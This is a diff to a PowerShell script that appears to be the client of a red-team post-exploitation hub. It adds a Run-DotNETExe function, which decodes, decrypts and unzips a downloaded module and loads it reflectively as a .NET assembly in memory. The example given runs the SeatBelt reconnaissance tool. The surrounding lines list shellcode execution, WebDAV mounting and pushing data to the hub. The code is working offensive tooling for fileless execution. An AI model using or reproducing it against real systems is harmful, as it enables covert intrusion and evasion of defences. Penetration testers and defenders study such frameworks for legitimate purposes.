@@ -214,6 +214,44 @@ Execute the exe module 47 in memory
     }
 }
 
+
+function Run-DotNETExe {
+<#
+.SYNOPSIS
+
+Executes a .NET exe module in memory, which must be loaded first.
+
+.EXAMPLE
+
+Load-HubModule SeatBelt
+Run-DotNETExe 47 "system"
+
+Description
+-----------
+Load and execute the .NET binary 47 in memory with the parameter "system"
+#>
+
+    Param(
+        [parameter(Mandatory=$true)]
+        [Int]
+        $n,
+
+        [parameter(Mandatory=$false)]
+        [string[]] $Arguments
+
+    )
+
+    $code = $Modules[$n]["code"]
+    $code = [System.Convert]::FromBase64String($code)
+    $code = Decrypt-Code $code $KEY
+    $code = Unzip-Code $code
+    $a = [Reflection.Assembly]::Load([byte[]]$code)
+    $al = New-Object -TypeName System.Collections.ArrayList
+    $al.add($Arguments)
+    $a.EntryPoint.Invoke($Null, $al.ToArray());
+}
+
+
 function Run-Shellcode {
 <#
 .SYNOPSIS
@@ -375,6 +413,7 @@ The letter the mounted drive will receive (default: 'S')
     }
 }
 
+
 function Unmount-Webdav {
 <#
 .SYNOPSIS
@@ -398,6 +437,7 @@ The following functions are available (some with short aliases):
   * List-HubModules (lshm)
   * Load-HubModule (lhm)
   * Run-Exe (re)
+  * Run-DotNETExe (rdne)
   * Run-Shellcode (rsh)
   * PushTo-Hub (pth)
   * Mount-Webdav (mwd)
@@ -411,6 +451,7 @@ try { New-Alias -Name pth -Value PushTo-Hub } catch { }
 try { New-Alias -Name lhm -Value Load-HubModule } catch { }
 try { New-Alias -Name lshm -Value List-HubModules } catch { }
 try { New-Alias -Name re -Value Run-Exe } catch { }
+try { New-Alias -Name rdne -Value Run-DotNETExe } catch { }
 try { New-Alias -Name rsh -Value Run-Shellcode } catch { }
 try { New-Alias -Name mwd -Value Mount-Webdav } catch { }
 try { New-Alias -Name uwd -Value Unmount-Webdav } catch { }
